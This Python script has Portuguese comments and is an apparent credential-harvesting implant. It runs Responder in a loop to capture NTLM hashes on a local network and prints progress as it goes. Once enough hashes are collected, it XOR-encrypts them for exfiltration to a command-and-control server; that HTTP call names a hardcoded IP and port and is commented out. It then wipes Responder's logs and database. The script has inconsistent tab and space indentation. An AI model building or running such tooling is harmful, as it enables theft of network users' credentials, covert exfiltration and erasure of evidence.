import os
import subprocess
from datetime import datetime
import base64
import requests
import time
import sys

def xor_encrypt(base64_string, key):
    key_length = len(key)
    encrypted_bytes = []
    for i, byte in enumerate(base64_string):
        encrypted_byte = byte ^ key[i % key_length]  # Aplicando XOR byte a byte
        encrypted_bytes.append(encrypted_byte)
    return bytes(encrypted_bytes)

def get_eth0_ip():
    while True:
        try:
            result = subprocess.run(['ip', 'addr', 'show', 'eth1'], capture_output=True, text=True)
            output = result.stdout
            lines = output.splitlines()
            for line in lines:
                if 'inet ' in line:  # Procura pela linha que contém 'inet '
                    ip_address = line.split()[1]
                    return ip_address
            # Se nenhum endereço IP foi encontrado, espera por um curto período antes de tentar novamente
            time.sleep(1)
        except subprocess.CalledProcessError:
            # Em caso de erro ao executar o comando, espera e tenta novamente
            time.sleep(1)

# Lê e armazena o MAC Address Capturado a partir do arquivo /tmp/captured_mac.txt
conteudo_arquivo = ""
nome_arquivo = "/tmp/captured_mac.txt"
try:
    with open(nome_arquivo, 'r') as f:
        conteudo_arquivo = f.read()
        if len(conteudo_arquivo) > 5:
            print(f"[!] MAC Capturado: {conteudo_arquivo}")
            print("[+] MAC Alterado! (macchanger)")
        else:
            print("[X] Nenhum MAC Encontrado...")
            sys.exit(0)
except FileNotFoundError:
    print(f"[X] Erro: o arquivo '{nome_arquivo}' não foi encontrado.")
    sys.exit(0)

print("[+] Aguardando definir o ip...")

ip = get_eth0_ip()
print(f'[!] IPv4: {ip}')


print("[+] Iniciando Responder")
os.system("sudo service responder stop")
os.system("sudo service responder start")
i=0
while True:
    # Verifica Hashes Coletados + Filtra lista
    output = subprocess.check_output("/usr/share/responder/DumpHash.py", shell=True)
    lista = str(output).split("\\n")
    lista_filtrada = [elemento for elemento in lista if "::" in elemento]

    # Verifica Quantidade de Hashes Coleta + Cria Arquivo .txt único de Backup
    nome_arquivo="hashes-"+datetime.now().strftime("%Y-%m-%d-%H-%M-%S")+".txt"
    ip = get_eth0_ip()
    print("[+]",len(lista_filtrada),"Hashes coletadas |",ip,"| Tempo:",i,"s")
    i+=10
    if len(lista_filtrada) >= 10:
        print("[+] Salvando hashes coletados no arquivo:",nome_arquivo)
        os.system("cp DumpNTLMv2.txt "+nome_arquivo)

	    
	# Exfiltrar para C2    
	print("[+] Exfiltrando hashes via HTTP")
        lista_hashes=""
        # Lista -> Base64
        for hashes in lista_filtrada: lista_hashes+=hashes+","
        b = base64.b64encode(bytes(lista_hashes, 'utf-8')) # bytes
        # Base64 -> Cripto XOR
        # Chave hardcoded (por exemplo, uma lista de bytes)
        key = [0x1A, 0x2B, 0x3C, 0x4D, 0x5E]  # Substitua pelos seus valores de chave
        # Decodificar a string base64 para byte
        decoded_bytes = base64.b64decode(b)
        # Criptografar usando XOR
        encrypted_bytes = xor_encrypt(decoded_bytes, key)
        #requests.get("http://69.55.55.7:3031/"+str(b))


	    
        print("[+] Limpando database Responder")
        os.system("echo '' > DumpNTLMv2.txt && echo '' > DumpNTLMv1.txt")
        os.system("rm /usr/share/responder/Responder.db")
        print("[+] Resetando Responder")
        os.system("sudo service responder restart")
        print("[+] Coletando novos Hashes...")
        i=0
    time.sleep(10)

        
